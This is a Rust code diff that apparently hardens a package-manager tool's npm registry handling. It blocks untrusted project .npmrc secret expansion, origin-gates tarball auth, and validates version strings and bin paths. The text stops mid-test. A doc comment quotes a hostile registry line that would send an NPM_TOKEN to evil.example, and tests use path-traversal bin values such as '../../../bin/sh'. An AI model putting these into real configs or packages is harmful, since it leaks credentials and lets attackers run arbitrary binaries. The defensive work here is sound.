@@ -2,7 +2,7 @@
 //! (exact / dist-tag / range), the tarball URL, and the dist integrity that gates
 //! extraction. Mirrors `version_management::node_index`'s split — a PURE resolver
 //! over already-fetched metadata ([`resolve_dist`]) plus a thin networked wrapper
-//! ([`resolve_version`]) — so the resolution logic is unit-tested offline.
+//! ([`resolve_version_authed`]) — so the resolution logic is unit-tested offline.
 //!
 //! Trust model: HTTPS authenticates that the packument came from the registry;
 //! the per-version `dist.integrity` (sha512) authenticates the tarball before it
@@ -10,7 +10,7 @@
 //! `dist.shasum` (sha1) is the fail-closed fallback for ancient publishes that
 //! predate `integrity`.
 
-use std::path::PathBuf;
+use std::path::{Component, Path, PathBuf};
 
 use anyhow::{Context, Result, bail};
 use serde_json::Value;
@@ -18,7 +18,6 @@ use sha1::Sha1;
 use sha2::{Digest, Sha512};
 
 use crate::version_management::download::{self, Auth};
-use crate::workspace::scripts::npmrc_value;
 
 /// A single resolved version's dist: where to fetch it, how to verify it, and the
 /// path within the extracted `package/` dir to the runnable bin.
@@ -29,7 +28,7 @@ pub struct VersionDist {
     pub integrity: Integrity,
     /// The bin entry's path relative to the package root (`bin/pnpm.cjs`). For a
     /// PM the resolver picks the entry whose name matches the package.
-    pub bin_subpath: PathBuf,
+    pub(crate) bin_subpath: PathBuf,
 }
 
 /// The dist checksum that gates extraction. sha512 (the modern `dist.integrity`
@@ -45,7 +44,7 @@ pub enum Integrity {
 
 /// The public npm registry — the floor of the precedence stack and the marker
 /// for "no mirror configured" (the tarball-origin rewrite is a no-op against it).
-pub const PUBLIC_REGISTRY: &str = "https://registry.npmjs.org";
+const PUBLIC_REGISTRY: &str = "https://registry.npmjs.org";
 
 /// The resolved registry for PM downloads: its base URL plus any auth that
 /// applies to the base's host. Carries enough to fetch the packument AND the
@@ -57,7 +56,7 @@ pub struct RegistryConfig {
     /// Trailing-slash-trimmed base URL — callers concatenate `/<pkg>`.
     pub base: String,
     /// The `Authorization` credential for `base`'s host, if any.
-    pub auth: Option<Auth>,
+    auth: Option<Auth>,
 }
 
 /// The registry base URL, in precedence order:
@@ -99,25 +98,146 @@ pub fn registry_config(root: &std::path::Path) -> RegistryConfig {
     }
 
     // 2–4. The ecosystem-standard stack: env override, then `.npmrc registry`,
-    // then public. The selection rule is the pure [`resolve_base`].
+    // then public. The selection rule is the pure [`resolve_base`]. The PROJECT
+    // `.npmrc` (repo-controlled) and the USER `~/.npmrc` (operator-controlled) are
+    // read SEPARATELY so their values can carry different trust for `${VAR}`
+    // expansion (see [`project_npmrc_layers`] / [`resolve_base`]).
+    let project = project_npmrc_layers(root);
+    // The most specific project file that sets `registry` wins, with its own trust.
+    let (project_registry, project_trusted) = project
+        .iter()
+        .rev()
+        .find_map(|(path, trusted)| read_npmrc_key(path, "registry").map(|r| (Some(r), *trusted)))
+        .unwrap_or((None, false));
+    let user_registry = home_npmrc().and_then(|p| read_npmrc_key(&p, "registry"));
     let base = resolve_base(
         env_nonempty("npm_config_registry"),
-        npmrc_value(root, "registry"),
+        project_registry,
+        user_registry,
+        project_trusted,
     );
-    let auth = npmrc_auth_for(root, &base);
+    let auth = npmrc_auth_for(&project, &base);
     RegistryConfig { base, auth }
 }
 
+/// Whether the PROJECT-level `.npmrc` is trusted to expand `${VAR}` environment
+/// references in its `registry` / auth values. OFF by default: a project `.npmrc`
+/// is repo-controlled — a clone or a PR fully authors it — so it must NOT be able
+/// to interpolate a secret from the caller's environment into a registry URL or
+/// auth credential bound for an attacker-chosen host. That interpolation happens
+/// before any lifecycle script runs, so script-blocking can't stop it; the only
+/// defense is to not expand it. This is the pnpm GHSA-3qhv-2rgh-x77r class:
+/// https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r (fixed in
+/// pnpm 10.34.2 and 11.5.3).
+///
+/// Opt back in the pnpm-compatible way: `PNPM_CONFIG_NPMRC_AUTH_FILE` (pnpm's
+/// `npmrcAuthFile`) is a PATH to the trusted auth file, not a boolean. pnpm
+/// re-trusts the project `.npmrc` ONLY when that path resolves to the project's
+/// own `.npmrc` (`PNPM_CONFIG_NPMRC_AUTH_FILE=.npmrc`, relative to the working
+/// dir) — a value pointing elsewhere (an absolute CI secret file) names a
+/// different trusted file and leaves the repo `.npmrc` UNtrusted. So gate on the
+/// resolved path matching `<root>/.npmrc`, never on mere presence — presence-trust
+/// would re-open the exfiltration for anyone who set the var to a non-project
+/// path. The flag comes from the ENVIRONMENT (a cloned/PR'd repo can't set it for
+/// you), and the USER `~/.npmrc` is always trusted regardless — it is the
+/// operator's own file, the home of the normal `${NPM_TOKEN}` pattern.
+///
+/// The project scope can be more than one file: in a workspace it is the root's
+/// `.npmrc` plus, per incumbent, the invoking member's
+/// ([`crate::workspace::npmrc::project_npmrc_paths`]). Each carries its own trust,
+/// so the opt-in re-trusts only the file it names. Returned lowest precedence first.
+fn project_npmrc_layers(root: &std::path::Path) -> Vec<(PathBuf, bool)> {
+    let auth_file = env_nonempty("PNPM_CONFIG_NPMRC_AUTH_FILE");
+    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    crate::workspace::npmrc::project_npmrc_paths(root)
+        .into_iter()
+        .map(|path| {
+            let trusted = auth_file
+                .as_deref()
+                .is_some_and(|raw| auth_file_trusts_project(raw, &cwd, &path));
+            (path, trusted)
+        })
+        .collect()
+}
+
+/// PURE: does the configured `PNPM_CONFIG_NPMRC_AUTH_FILE` path point AT the
+/// project `.npmrc` at `project_rc`? A relative value resolves against `cwd`
+/// (pnpm's rule). Comparison is fail-CLOSED: it trusts only when both paths
+/// canonicalize to the same real file; if either can't be canonicalized (e.g. the
+/// file doesn't exist), it returns false rather than risk trusting a
+/// repo-controlled file.
+fn auth_file_trusts_project(configured: &str, cwd: &Path, project_rc: &Path) -> bool {
+    let p = Path::new(configured);
+    let resolved = if p.is_absolute() {
+        p.to_path_buf()
+    } else {
+        cwd.join(p)
+    };
+    match (resolved.canonicalize(), project_rc.canonicalize()) {
+        (Ok(a), Ok(b)) => a == b,
+        _ => false,
+    }
+}
+
+/// The user-level `~/.npmrc` path, if a home directory resolves.
+fn home_npmrc() -> Option<PathBuf> {
+    dirs_next::home_dir().map(|h| h.join(".npmrc"))
+}
+
+/// Read a single `key=value` setting from ONE `.npmrc` file — no project→user
+/// fallback, no `${VAR}` expansion (the caller applies trust-aware expansion).
+/// Surrounding quotes are stripped and a blank value is treated as absent, matching
+/// [`crate::workspace::scripts::npmrc_value`]. Kept local so registry resolution can
+/// read the PROJECT and USER files independently and expand each per its trust.
+fn read_npmrc_key(path: &std::path::Path, key: &str) -> Option<String> {
+    let content = std::fs::read_to_string(path).ok()?;
+    for line in content.lines() {
+        let trimmed = line.trim();
+        if let Some((k, value)) = trimmed.split_once('=')
+            && k.trim() == key
+        {
+            let value = value.trim().trim_matches('"').trim_matches('\'');
+            if !value.is_empty() {
+                return Some(value.to_string());
+            }
+        }
+    }
+    None
+}
+
 /// PURE base selection for the ecosystem-standard stack (the COREPACK override is
-/// handled by the caller, ABOVE this): `npm_config_registry` wins over the
-/// `.npmrc registry` value, which wins over the public registry. Trailing slash
-/// trimmed; `${VAR}` interpolated. Unit-tested without mutating process env.
-fn resolve_base(npm_config_registry: Option<String>, npmrc_registry: Option<String>) -> String {
-    let raw = npm_config_registry
-        .filter(|s| !s.trim().is_empty())
-        .or(npmrc_registry)
-        .unwrap_or_else(|| PUBLIC_REGISTRY.to_string());
-    interpolate_env(&raw).trim_end_matches('/').to_string()
+/// handled by the caller, ABOVE this). Precedence, most specific first:
+/// `npm_config_registry` (env) > project `.npmrc registry` > user `~/.npmrc
+/// registry` > the public registry. Trailing slash trimmed.
+///
+/// `${VAR}` expansion is TRUST-AWARE. The env override and the user `~/.npmrc`
+/// value are operator-controlled, so they always expand. The PROJECT `.npmrc`
+/// value is repo-controlled, so it expands ONLY when `project_trusted`; untrusted,
+/// it is used LITERALLY. A hostile `registry=https://evil.example/${NPM_TOKEN}/`
+/// committed to a repo therefore sends the literal `${NPM_TOKEN}` placeholder over
+/// the wire, never the caller's secret (GHSA-3qhv-2rgh-x77r). Unit-tested without
+/// mutating process env — the untrusted path needs no environment at all.
+fn resolve_base(
+    npm_config_registry: Option<String>,
+    project_npmrc_registry: Option<String>,
+    user_npmrc_registry: Option<String>,
+    project_trusted: bool,
+) -> String {
+    if let Some(raw) = npm_config_registry.filter(|s| !s.trim().is_empty()) {
+        return interpolate_env(&raw).trim_end_matches('/').to_string();
+    }
+    if let Some(raw) = project_npmrc_registry.filter(|s| !s.trim().is_empty()) {
+        let value = if project_trusted {
+            interpolate_env(&raw)
+        } else {
+            raw
+        };
+        return value.trim_end_matches('/').to_string();
+    }
+    if let Some(raw) = user_npmrc_registry.filter(|s| !s.trim().is_empty()) {
+        return interpolate_env(&raw).trim_end_matches('/').to_string();
+    }
+    PUBLIC_REGISTRY.to_string()
 }
 
 /// `COREPACK_NPM_TOKEN` (bearer) wins over `COREPACK_NPM_USERNAME`+`_PASSWORD`
@@ -176,21 +296,24 @@ fn interpolate_with(value: &str, mut lookup: impl FnMut(&str) -> Option<String>)
 /// matching `registry_base`. This is npm's nerfDart resolution: an auth line is
 /// keyed by a registry URL minus its scheme (`//npm.example.com/path/:_authToken`),
 /// and the most-specific (longest) matching prefix wins.
-fn npmrc_auth_for(root: &std::path::Path, registry_base: &str) -> Option<Auth> {
-    let mut text = String::new();
-    let candidates = [
-        root.join(".npmrc"),
-        dirs_next::home_dir()
-            .map(|h| h.join(".npmrc"))
-            .unwrap_or_default(),
-    ];
-    for path in &candidates {
-        if let Ok(content) = std::fs::read_to_string(path) {
-            text.push_str(&content);
-            text.push('\n');
-        }
-    }
-    parse_npmrc_auth(&text, registry_base, |name| std::env::var(name).ok())
+fn npmrc_auth_for(project: &[(PathBuf, bool)], registry_base: &str) -> Option<Auth> {
+    let project: Vec<(String, bool)> = project
+        .iter()
+        .map(|(path, trusted)| (std::fs::read_to_string(path).unwrap_or_default(), *trusted))
+        .collect();
+    let user = home_npmrc()
+        .and_then(|p| std::fs::read_to_string(p).ok())
+        .unwrap_or_default();
+    // Preserve npm's per-prefix last-writer-wins: project text first, user text
+    // last. Trust is per-source — the user file always expands `${VAR}`; a
+    // project file only when trusted — so a repo-controlled auth line can never
+    // interpolate a secret from the environment unless the operator opted in.
+    let mut sources: Vec<(&str, bool)> = project
+        .iter()
+        .map(|(text, trusted)| (text.as_str(), *trusted))
+        .collect();
+    sources.push((&user, true));
+    parse_npmrc_auth(&sources, registry_base, |name| std::env::var(name).ok())
 }
 
 /// PURE auth resolver over already-read `.npmrc` text — no filesystem, no network,
@@ -200,11 +323,18 @@ fn npmrc_auth_for(root: &std::path::Path, registry_base: &str) -> Option<Auth> {
 /// chosen credential is the one whose `//host[/path]` key is the longest prefix of
 /// the base (compared scheme-stripped, npm's nerfDart form).
 ///
+/// `sources` is an ordered list of `(npmrc text, trusted)` layers, LOW precedence
+/// first (later layers overwrite earlier per prefix+field, npm's last-writer-wins
+/// — the caller passes the project file before the user file). `${VAR}` in a
+/// value is expanded through `lookup` ONLY when that source is `trusted`; an
+/// UNTRUSTED (repo-controlled) source keeps `${VAR}` LITERAL, so a committed auth
+/// line cannot interpolate a caller secret into a credential for an
+/// attacker-chosen host (GHSA-3qhv-2rgh-x77r).
+///
 /// Per host-prefix, `:_authToken` (bearer) wins over `:_auth` (basic) wins over
-/// `:username`+`:_password` (basic). All values are `${VAR}`-interpolated through
-/// `lookup`.
+/// `:username`+`:_password` (basic).
 fn parse_npmrc_auth(
-    npmrc: &str,
+    sources: &[(&str, bool)],
     registry_base: &str,
     mut lookup: impl FnMut(&str) -> Option<String>,
 ) -> Option<Auth> {
@@ -221,7 +351,13 @@ fn parse_npmrc_auth(
     }
     let mut by_prefix: rustc_hash::FxHashMap<String, Fields> = rustc_hash::FxHashMap::default();
 
-    for line in npmrc.lines() {
+    // Flatten the layers to one `(line, trusted)` stream, low precedence first, so
+    // a later layer's field overwrites an earlier one for the same prefix (npm's
+    // last-writer-wins) while each line keeps its source's trust.
+    let lines = sources
+        .iter()
+        .flat_map(|(npmrc, trusted)| npmrc.lines().map(move |line| (line, *trusted)));
+    for (line, trusted) in lines {
         let line = line.trim();
         if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
             continue;
@@ -239,10 +375,15 @@ fn parse_npmrc_auth(
             continue;
         };
         let prefix = prefix.trim_end_matches('/');
-        let val = interpolate_with(
-            raw_val.trim().trim_matches('"').trim_matches('\''),
-            &mut lookup,
-        );
+        let raw = raw_val.trim().trim_matches('"').trim_matches('\'');
+        // Trust-aware expansion: only a trusted source interpolates `${VAR}`; an
+        // untrusted (repo-controlled) value stays literal so a committed secret
+        // placeholder can never resolve to the caller's environment.
+        let val = if trusted {
+            interpolate_with(raw, &mut lookup)
+        } else {
+            raw.to_string()
+        };
         let entry = by_prefix.entry(prefix.to_string()).or_default();
         match field {
             "_authToken" => entry.auth_token = Some(val),
@@ -308,7 +449,7 @@ fn strip_scheme(url: &str) -> &str {
 /// the configured registry's. Only rewritten when a NON-public registry is
 /// configured; a public-registry config leaves the URL untouched (the common
 /// case, and the safe one — never redirect a public tarball).
-pub fn rewrite_tarball_origin(tarball: &str, registry_base: &str) -> String {
+fn rewrite_tarball_origin(tarball: &str, registry_base: &str) -> String {
     // No rewrite when the configured registry is the public one.
     if origin_of(registry_base) == Some(origin_of(PUBLIC_REGISTRY).unwrap()) {
         return tarball.to_string();
@@ -323,6 +464,30 @@ pub fn rewrite_tarball_origin(tarball: &str, registry_base: &str) -> String {
     // Swap the origin (scheme+host[+port]); keep the rest of the URL verbatim.
     let rest = &tarball[tar_origin.len()..];
     format!("{reg_origin}{rest}")
+}
+
+/// The registry credential to present when DOWNLOADING `tarball_url` — `cfg.auth`,
+/// but ONLY when the tarball is served from the SAME `scheme://host[:port]` origin
+/// the credential belongs to. `dist.tarball` is an absolute URL the packument
+/// declares, so under a malicious / MITM'd registry it can name an ARBITRARY
+/// foreign host; attaching the registry bearer token (`_authToken`) to that
+/// request would disclose the credential in flight (N1b). The packument fetch is
+/// unaffected — it always targets `cfg.base` and keeps full auth; this gate is
+/// only for the tarball download. For a private mirror [`rewrite_tarball_origin`]
+/// has already pinned the tarball onto the registry's own origin, so this matches
+/// and auth is attached exactly as before; the public-registry tarball is on the
+/// registry host, so it matches too. The only request that loses auth is one to a
+/// host the credential was never issued for — the leak. Mirrors aube matching
+/// tarball auth to the tarball's own host.
+pub fn auth_for_tarball<'a>(cfg: &'a RegistryConfig, tarball_url: &str) -> Option<&'a Auth> {
+    let reg_origin = origin_of(&cfg.base)?;
+    let tar_origin = origin_of(tarball_url)?;
+    // scheme + host are ASCII-case-insensitive; the origin carries no path/query.
+    if reg_origin.eq_ignore_ascii_case(tar_origin) {
+        cfg.auth.as_ref()
+    } else {
+        None
+    }
 }
 
 /// The `scheme://host[:port]` origin of a URL — everything up to (not including)
@@ -346,7 +511,7 @@ fn origin_of(url: &str) -> Option<&str> {
 /// write) separates them by space. [`normalize_range`] bridges the two so a
 /// `>=9 <11` pin resolves rather than erroring. The `||` OR operator is NOT
 /// supported (Cargo's `semver` has no OR) — vanishingly rare in a PM pin.
-pub fn resolve_dist(packument: &Value, spec: &str) -> Result<VersionDist> {
+fn resolve_dist(packument: &Value, spec: &str) -> Result<VersionDist> {
     let spec = spec.trim();
     let versions = packument
         .get("versions")
@@ -398,9 +563,54 @@ pub(crate) fn normalize_range(spec: &str) -> String {
     spec.split_whitespace().collect::<Vec<_>>().join(", ")
 }
 
+/// Reject a registry-declared version string before it becomes a STORE PATH
+/// component (and a `.tmp-<version>-…` work-dir name) that nub then EXECUTES. The
+/// dist-tag branch of [`resolve_dist`] passes a raw, registry-controlled
+/// `dist-tags.<tag>` value straight into [`dist_from_meta`], and the runnable
+/// target is built `<store>/pm/<pm>/<version>/package/<bin>` via `Path::join`,
+/// which an absolute or `..`-laden version escapes (the F0c registry-exec
+/// boundary). Mirrors the engine's own guard `aube_store::validate_version`
+/// (nub-core has no aube dep, so the char-blocklist is restated here, the same
+/// way [`safe_bin_subpath`] mirrors aube's bin-path guard): reject path
+/// separators on any platform, NUL, control chars, and the `.`/`..` dir aliases.
+///
+/// nub-core is deliberately STRICTER than aube-store on one byte — it also rejects
+/// `:`. The two guards have different input domains. aube-store's `version` slot
+/// can carry non-semver specs (git URLs, npm aliases, file specs) that legitimately
+/// contain `:`, so blocking it there would break real installs. nub-core's
+/// `version` is always a CONCRETE PUBLISHED npm version: every branch of
+/// [`resolve_dist`] passes a `versions[..]` KEY (npm publishes are semver), which
+/// never contains `:`. Blocking it here costs nothing and closes a real escape — on
+/// Windows `Path::join` treats a drive-prefixed component (`C:foo`) as drive-relative
+/// and DISCARDS the base, so `<store>/pm/<pm>` joined with `C:foo` resolves to
+/// `C:foo` (CWD on drive C:), relocating the written + executed PM bin outside the
+/// store. `/` and `\` were already blocked, so `:` was the last Windows
+/// separator-equivalent the blocklist missed.
+/// A normal semver — `9.5.0`, `11.0.0-rc.1` — passes untouched.
+fn validate_version(version: &str) -> bool {
+    if version.is_empty() || version.len() > 256 {
+        return false;
+    }
+    if version
+        .bytes()
+        .any(|b| b.is_ascii_control() || matches!(b, b'/' | b'\\' | b':' | b'\0'))
+    {
+        return false;
+    }
+    !matches!(version, "." | "..")
+}
+
 /// Build a [`VersionDist`] from one `versions[X.Y.Z]` entry. `version` is the
 /// resolved key (so callers print the concrete version, never the spec).
 fn dist_from_meta(version: &str, meta: &Value) -> Result<VersionDist> {
+    // The sole construction point of `VersionDist`, so the single chokepoint for
+    // the version string before it flows into a store path. The dist-tag branch
+    // feeds a raw registry value here; reject anything that could escape the join.
+    if !validate_version(version) {
+        bail!(
+            "registry returned an unsafe version string {version:?} — refusing to use it as a store path"
+        );
+    }
     let dist = meta
         .get("dist")
         .with_context(|| format!("version {version} has no \"dist\" object"))?;
@@ -448,14 +658,48 @@ fn parse_integrity(dist: &Value) -> Option<Integrity> {
 pub(crate) fn bin_subpath(meta: &Value) -> Option<PathBuf> {
     let bin = meta.get("bin")?;
     if let Some(path) = bin.as_str() {
-        return Some(PathBuf::from(path));
+        return node_bin_subpath(meta, path);
     }
     let map = bin.as_object()?;
     let name = meta.get("name").and_then(Value::as_str);
     let chosen = name
         .and_then(|n| map.get(n))
         .or_else(|| (map.len() == 1).then(|| map.values().next()).flatten())?;
-    chosen.as_str().map(PathBuf::from)
+    node_bin_subpath(meta, chosen.as_str()?)
+}
+
+fn node_bin_subpath(meta: &Value, path: &str) -> Option<PathBuf> {
+    // pnpm 12's bin map points at a native placeholder and shell wrappers.
+    // Provisioning skips preinstall; its Corepack launchers bootstrap the binary.
+    let path = match (meta.get("name").and_then(Value::as_str), path) {
+        (Some("pnpm"), "pnpm" | "./pnpm") => "bin/pnpm.mjs",
+        (Some("pnpm"), "pnpx" | "./pnpx") => "bin/pnpx.mjs",
+        _ => path,
+    };
+    safe_bin_subpath(path)
+}
+
+/// Defense-in-depth gate on a registry-declared bin path before it becomes an
+/// EXECUTED target. The packument's `bin` is attacker-controlled under a
+/// compromised/MITM'd registry, and the runnable path is built as
+/// `<store>/<version>/package/<bin_subpath>` then run; because `Path::join`
+/// discards the base on an absolute component, an absolute entry (`/bin/sh`) or
+/// one with `..` traversal would point the executed target OUTSIDE the package
+/// dir, gated only by `is_file()`. Reject (drop to `None` — a malformed/malicious
+/// bin surfaces as the consumers' existing "no resolvable bin" error) rather than
+/// silently rewriting the path. The `Component` scan is stricter than
+/// `Path::is_absolute` and platform-correct: it also catches a Windows
+/// drive-relative (`C:foo` → `Prefix`) or root-relative (`\foo` → `RootDir`)
+/// entry that `is_absolute()` misses, and rejects any `..` segment.
+fn safe_bin_subpath(raw: &str) -> Option<PathBuf> {
+    let path = PathBuf::from(raw);
+    let escapes = path.components().any(|c| {
+        matches!(
+            c,
+            Component::Prefix(_) | Component::RootDir | Component::ParentDir
+        )
+    });
+    (!escapes && !path.as_os_str().is_empty()).then_some(path)
 }
 
 /// The bin path of a NAMED entry in a `bin` map (`npx`, `pnpx`, `yarnpkg`) —
@@ -467,37 +711,66 @@ pub(crate) fn bin_subpath(meta: &Value) -> Option<PathBuf> {
 pub(crate) fn named_bin_subpath(meta: &Value, entry: &str) -> Option<PathBuf> {
     let bin = meta.get("bin")?;
     if let Some(path) = bin.as_str() {
-        return (meta.get("name").and_then(Value::as_str) == Some(entry))
-            .then(|| PathBuf::from(path));
+        if meta.get("name").and_then(Value::as_str) != Some(entry) {
+            return None;
+        }
+        return node_bin_subpath(meta, path);
     }
-    bin.as_object()?.get(entry)?.as_str().map(PathBuf::from)
+    node_bin_subpath(meta, bin.as_object()?.get(entry)?.as_str()?)
 }
 
-/// Networked wrapper over a bare base URL (no auth): fetch the packument from
-/// `base` and resolve `spec` against it. `pkg` is the package name (`pnpm`, `npm`,
-/// `yarn`). Retained for the no-auth `nub pm use` caller; provisioning goes through
-/// [`resolve_version_authed`], which carries the host auth and rewrites the tarball
-/// origin onto a configured mirror.
-pub fn resolve_version(base: &str, pkg: &str, spec: &str) -> Result<VersionDist> {
-    resolve_version_authed(
-        &RegistryConfig {
-            base: base.trim_end_matches('/').to_string(),
-            auth: None,
-        },
-        pkg,
-        spec,
-    )
-}
+/// npm's abbreviated ("corgi") packument media type. Same `dist-tags` /
+/// `versions[]` / `dist` / `bin` shape [`resolve_dist`] consumes, at a fraction
+/// of the bytes — the full `npm` packument is ~25 MB identity-encoded, the corgi
+/// form ~2.4 MB. The public registry and the mainstream private ones (Verdaccio,
+/// Artifactory, GitHub Packages) honor it; a registry that ignores the `Accept`
+/// header serves the full document, which resolves identically.
+const CORGI_ACCEPT: &str = "application/vnd.npm.install-v1+json";
 
-/// Networked wrapper: fetch the packument from `cfg.base` (presenting `cfg.auth`
-/// to an auth-required mirror) and resolve `spec` against it. `pkg` is the package
-/// name (`pnpm`, `npm`, `yarn`). The resolved `dist.tarball` is rewritten onto the
-/// configured registry's origin ([`rewrite_tarball_origin`]) so a mirrored install
-/// fetches the tarball from the same host the packument came from, not a hardcoded
+/// Networked wrapper: resolve `spec` against `cfg.base` (presenting `cfg.auth`
+/// to an auth-required mirror). `pkg` is the package name (`pnpm`, `npm`,
+/// `yarn`). The resolved `dist.tarball` is rewritten onto the configured
+/// registry's origin ([`rewrite_tarball_origin`]) so a mirrored install fetches
+/// the tarball from the same host the metadata came from, not a hardcoded
 /// public URL.
+///
+/// An exact version or dist-tag resolves via `GET /{pkg}/{spec}` — the
+/// registry's version-manifest endpoint, a few KB — because the shim's dynamic
+/// default re-resolves `latest` on real invocations and paying a whole packument
+/// per call was the dominant cost of #491 (25 MB, uncompressed, per `npx` run).
+/// Only a RANGE needs the version-enumerating packument, fetched with the corgi
+/// `Accept`. A registry that doesn't implement the version endpoint — an HTTP
+/// error, or a 200 whose body isn't a usable manifest (a path-prefix proxy
+/// serving the whole packument, an HTML error page) — falls back to the
+/// packument, so no registry the packument path handled regresses. A TRANSPORT
+/// failure (host unreachable) propagates instead, since the packument fetch
+/// would only re-run the same doomed connect (and take its own retries doing it).
 pub fn resolve_version_authed(cfg: &RegistryConfig, pkg: &str, spec: &str) -> Result<VersionDist> {
-    let url = format!("{}/{pkg}", cfg.base.trim_end_matches('/'));
-    let body = download::fetch_text_auth(&url, cfg.auth.as_ref())
+    let spec = spec.trim();
+    let base = cfg.base.trim_end_matches('/');
+    let is_exact = semver::Version::parse(spec).is_ok();
+    let is_range = !is_exact && semver::VersionReq::parse(&normalize_range(spec)).is_ok();
+    if !is_range {
+        let url = format!("{base}/{pkg}/{spec}");
+        match download::fetch_text_accept_auth(&url, None, cfg.auth.as_ref()) {
+            Ok(body) => {
+                if let Ok(meta) = serde_json::from_str::<Value>(&body)
+                    && let Ok(mut dist) = resolve_dist_from_version_manifest(&meta)
+                {
+                    dist.tarball = rewrite_tarball_origin(&dist.tarball, &cfg.base);
+                    return Ok(dist);
+                }
+                // 200 but not a version manifest → packument fallback below.
+            }
+            Err(e) if e.status.is_none() => {
+                return Err(e.error).with_context(|| format!("fetching {url}"));
+            }
+            Err(_) => {} // endpoint unsupported/404 on this registry → packument
+        }
+    }
+    let url = format!("{base}/{pkg}");
+    let body = download::fetch_text_accept_auth(&url, Some(CORGI_ACCEPT), cfg.auth.as_ref())
+        .map_err(|e| e.error)
         .with_context(|| format!("fetching packument {url}"))?;
     let packument: Value =
         serde_json::from_str(&body).with_context(|| format!("parsing packument {url}"))?;
@@ -505,6 +778,21 @@ pub fn resolve_version_authed(cfg: &RegistryConfig, pkg: &str, spec: &str) -> Re
         resolve_dist(&packument, spec).with_context(|| format!("resolving {pkg}@{spec}"))?;
     dist.tarball = rewrite_tarball_origin(&dist.tarball, &cfg.base);
     Ok(dist)
+}
+
+/// Build a [`VersionDist`] from a VERSION-MANIFEST document (`GET
+/// /{pkg}/{version-or-tag}`) — the same `name`/`bin`/`dist` shape as one
+/// packument `versions[]` entry, plus its own top-level `version`. PURE — no
+/// network — so the parsing is unit-tested offline. Routes through
+/// [`dist_from_meta`], the single `VersionDist` chokepoint, so the
+/// store-path guard ([`validate_version`]) and the bin-path guard apply to this
+/// server-controlled document exactly as to a packument.
+pub fn resolve_dist_from_version_manifest(meta: &Value) -> Result<VersionDist> {
+    let version = meta
+        .get("version")
+        .and_then(Value::as_str)
+        .context("version manifest has no \"version\" field")?;
+    dist_from_meta(version, meta)
 }
 
 /// Verify a downloaded tarball against its dist integrity. Fail-closed: a mismatch
@@ -665,6 +953,48 @@ mod tests {
     }
 
     #[test]
+    fn version_manifest_resolves_through_the_same_guards_as_a_packument() {
+        // The version-manifest endpoint (`GET /{pkg}/{version-or-tag}`) returns
+        // one versions[] entry with its own top-level "version" — the fast path
+        // for exact/tag specs (#491). It must flow through dist_from_meta, the
+        // VersionDist chokepoint, so the store-path guard holds.
+        let meta: Value = serde_json::from_str(
+            r#"{
+                "name": "npm", "version": "12.0.1",
+                "bin": { "npm": "bin/npm-cli.js", "npx": "bin/npx-cli.js" },
+                "dist": {
+                    "tarball": "https://registry.npmjs.org/npm/-/npm-12.0.1.tgz",
+                    "integrity": "sha512-DDDD"
+                }
+            }"#,
+        )
+        .unwrap();
+        let dist = resolve_dist_from_version_manifest(&meta).unwrap();
+        assert_eq!(dist.version, "12.0.1");
+        assert_eq!(dist.integrity, Integrity::Sha512("DDDD".into()));
+        assert_eq!(dist.bin_subpath, PathBuf::from("bin/npm-cli.js"));
+
+        // No "version" field → error, never a guessed store path.
+        let no_version: Value = serde_json::from_str(r#"{ "name": "npm" }"#).unwrap();
+        assert!(resolve_dist_from_version_manifest(&no_version).is_err());
+
+        // A server-controlled version that would escape the store join is
+        // refused — same F0c posture as the packument dist-tag branch.
+        let escaping: Value = serde_json::from_str(
+            r#"{ "name": "npm", "version": "..", "bin": "bin/npm-cli.js",
+                 "dist": { "tarball": "https://x/t.tgz", "integrity": "sha512-EEEE" } }"#,
+        )
+        .unwrap();
+        let err = resolve_dist_from_version_manifest(&escaping)
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains("unsafe version string"),
+            "escaping version must be refused: {err}"
+        );
+    }
+
+    #[test]
     fn normalize_range_bridges_space_separated_comparators_only() {
         // Space-separated comparators → comma form (the only translation).
         assert_eq!(normalize_range(">=9 <11"), ">=9, <11");
@@ -708,6 +1038,55 @@ mod tests {
     }
 
     #[test]
+    fn pnpm_native_placeholders_resolve_to_node_launchers() {
+        for prefix in ["", "./"] {
+            let meta = serde_json::json!({
+                "name": "pnpm",
+                "version": "12.0.0",
+                "bin": {
+                    "pnpm": format!("{prefix}pnpm"),
+                    "pnpx": format!("{prefix}pnpx")
+                },
+                "dist": {
+                    "tarball": "https://registry.npmjs.org/pnpm/-/pnpm-12.0.0.tgz",
+                    "integrity": "sha512-deadbeef"
+                }
+            });
+            let dist = resolve_dist_from_version_manifest(&meta).unwrap();
+            assert_eq!(dist.bin_subpath, PathBuf::from("bin/pnpm.mjs"));
+            for entry in ["pnpm", "pnpx"] {
+                assert_eq!(
+                    named_bin_subpath(&meta, entry),
+                    Some(PathBuf::from(format!("bin/{entry}.mjs"))),
+                    "{entry} must use the Node launcher, not the native placeholder"
+                );
+            }
+            assert_eq!(named_bin_subpath(&meta, "missing"), None);
+
+            let single = serde_json::json!({
+                "name": "pnpm",
+                "bin": format!("{prefix}pnpm")
+            });
+            assert_eq!(bin_subpath(&single), Some(PathBuf::from("bin/pnpm.mjs")));
+            assert_eq!(
+                named_bin_subpath(&single, "pnpm"),
+                Some(PathBuf::from("bin/pnpm.mjs"))
+            );
+            assert_eq!(named_bin_subpath(&single, "pnpx"), None);
+        }
+
+        let other = serde_json::json!({
+            "name": "other",
+            "bin": { "other": "pnpm", "pnpx": "pnpx" }
+        });
+        assert_eq!(bin_subpath(&other), Some(PathBuf::from("pnpm")));
+        assert_eq!(
+            named_bin_subpath(&other, "pnpx"),
+            Some(PathBuf::from("pnpx"))
+        );
+    }
+
+    #[test]
     fn named_bin_subpath_picks_arbitrary_entries_but_string_form_only_the_package_name() {
         // The map form: any entry resolves by name (the npx/pnpx seam).
         let meta: Value = serde_json::json!({
@@ -739,6 +1118,177 @@ mod tests {
     }
 
     #[test]
+    fn bin_subpath_rejects_a_path_that_escapes_the_package_dir() {
+        // The executed target is built as `<store>/<version>/package/<bin_subpath>`;
+        // an absolute or `..`-laden registry `bin` would escape that dir. Both the
+        // string and map forms, for both resolvers, must drop to None — never an
+        // out-of-package PathBuf the caller would `is_file()`-gate and run.
+        for bad in [
+            "/bin/sh",
+            "../../../bin/sh",
+            "bin/../../escape",
+            "/abs/cli.js",
+        ] {
+            assert_eq!(
